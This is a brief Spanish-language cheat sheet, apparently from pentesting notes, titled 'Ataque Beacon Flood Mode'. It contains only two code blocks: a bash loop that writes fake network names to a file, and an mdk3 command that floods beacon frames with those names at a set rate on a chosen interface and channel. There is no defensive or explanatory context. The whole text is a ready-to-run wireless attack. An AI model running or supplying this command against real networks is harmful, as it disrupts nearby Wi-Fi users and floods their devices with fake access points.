
# Ataque Beacon Flood Mode

```bash
for i in $(seq 1 10); do echo "MyNetwork$i"; done
for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
```

```bash
mdk3 <interfaz> b -f redes.txt -a -s 1000 -c <canal> 
```